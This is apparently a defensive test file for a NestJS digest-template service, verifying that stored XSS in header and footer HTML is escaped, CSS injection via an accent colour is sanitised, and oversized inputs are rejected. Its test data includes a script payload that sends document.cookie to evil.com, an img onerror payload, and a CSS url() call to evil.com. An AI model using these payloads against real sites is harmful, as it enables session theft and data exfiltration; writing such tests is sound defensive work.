/**
 * ADVERSARIAL TESTS: Digest Templates
 *
 * SEC-053: Stored XSS via headerHtml/footerHtml — FIXED (escaped in preview)
 * SEC-054: CSS injection via unvalidated accentColor — FIXED (hex validation + sanitized in render)
 * SEC-055: No @MaxLength or @ArrayMaxSize on DTO fields — FIXED
 */

import { describe, it, expect, vi } from 'vitest';
import { Test } from '@nestjs/testing';
import { DigestTemplateService } from './digest-template.service';
import { PrismaService } from '../prisma/prisma.service';
import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { CreateDigestTemplateDto } from './dto/create-digest-template.dto';

function buildMockPrisma() {
  return {
    digestTemplate: {
      create: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      update: vi.fn(),
      updateMany: vi.fn(),
      delete: vi.fn(),
    },
    $transaction: vi.fn(),
  };
}

describe('[SEC-053] stored XSS in digest template preview — FIXED', () => {
  it('headerHtml is escaped in renderPreview output', async () => {
    const prisma = buildMockPrisma();
    const module = await Test.createTestingModule({
      providers: [
        DigestTemplateService,
        { provide: PrismaService, useValue: prisma },
      ],
    }).compile();
    const service = module.get<DigestTemplateService>(DigestTemplateService);

    const xssPayload = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>';

    prisma.digestTemplate.findUnique.mockResolvedValue({
      id: 't1',
      name: 'XSS Template',
      subject: 'Test',
      headerHtml: xssPayload,
      footerHtml: '',
      sections: [],
      accentColor: '#c5a880',
      logoUrl: null,
      isActive: false,
    });

    const html = await service.renderPreview('t1');

    expect(html).not.toContain(xssPayload);
    expect(html).toContain('&lt;script&gt;');
  });

  it('footerHtml is escaped in renderPreview output', async () => {
    const prisma = buildMockPrisma();
    const module = await Test.createTestingModule({
      providers: [
        DigestTemplateService,
        { provide: PrismaService, useValue: prisma },
      ],
    }).compile();
    const service = module.get<DigestTemplateService>(DigestTemplateService);

    const xssPayload = '<img src=x onerror="alert(1)">';

    prisma.digestTemplate.findUnique.mockResolvedValue({
      id: 't1',
      name: 'Template',
      subject: 'Test',
      headerHtml: '',
      footerHtml: xssPayload,
      sections: [],
      accentColor: '#c5a880',
      logoUrl: null,
      isActive: false,
    });

    const html = await service.renderPreview('t1');
    expect(html).not.toContain(xssPayload);
    expect(html).toContain('&lt;img');
  });
});

describe('[SEC-054] CSS injection via accentColor — FIXED', () => {
  it('invalid accentColor is sanitized to default in renderPreview', async () => {
    const prisma = buildMockPrisma();
    const module = await Test.createTestingModule({
      providers: [
        DigestTemplateService,
        { provide: PrismaService, useValue: prisma },
      ],
    }).compile();
    const service = module.get<DigestTemplateService>(DigestTemplateService);

    const cssInjection = '#000; } body { background-image: url(https://evil.com/exfil)';

    prisma.digestTemplate.findUnique.mockResolvedValue({
      id: 't1',
      name: 'Template',
      subject: 'Test',
      headerHtml: '',
      footerHtml: '',
      sections: ['new_posts'],
      accentColor: cssInjection,
      logoUrl: null,
      isActive: false,
    });

    const html = await service.renderPreview('t1');

    expect(html).not.toContain(cssInjection);
    expect(html).toContain('#c5a880');
  });
});

describe('[SEC-055] DTO constraints — FIXED', () => {
  it('headerHtml rejects megabyte payloads (@MaxLength)', async () => {
    const dto = plainToInstance(CreateDigestTemplateDto, {
      name: 'Test',
      subject: 'Subject',
      headerHtml: 'x'.repeat(1_000_000),
    });

    const errors = await validate(dto);
    expect(errors.filter((e) => e.property === 'headerHtml').length).toBeGreaterThan(0);
  });

  it('sections rejects thousands of items (@ArrayMaxSize)', async () => {
    const dto = plainToInstance(CreateDigestTemplateDto, {
      name: 'Test',
      subject: 'Subject',
      sections: Array.from({ length: 10000 }, (_, i) => `section_${i}`),
    });

    const errors = await validate(dto);
    expect(errors.filter((e) => e.property === 'sections').length).toBeGreaterThan(0);
  });

  it('accentColor rejects non-hex strings (@Matches)', async () => {
    const dto = plainToInstance(CreateDigestTemplateDto, {
      name: 'Test',
      subject: 'Subject',
      accentColor: '<script>alert(1)</script>',
    });

    const errors = await validate(dto);
    expect(errors.filter((e) => e.property === 'accentColor').length).toBeGreaterThan(0);
  });

  it('accentColor accepts valid hex color', async () => {
    const dto = plainToInstance(CreateDigestTemplateDto, {
      name: 'Test',
      subject: 'Subject',
      accentColor: '#c5a880',
    });

    const errors = await validate(dto);
    expect(errors.filter((e) => e.property === 'accentColor')).toHaveLength(0);
  });
});
